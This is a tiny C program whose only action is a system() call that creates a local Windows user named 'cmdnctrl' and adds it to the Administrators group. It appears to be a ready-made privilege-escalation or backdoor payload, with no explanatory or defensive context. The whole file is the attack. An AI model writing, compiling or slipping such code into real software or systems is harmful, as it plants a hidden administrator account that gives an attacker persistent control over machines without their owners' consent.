#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user cmdnctrl <password> /add && net localgroup administrators cmdnctrl /add");
  return 0;
}
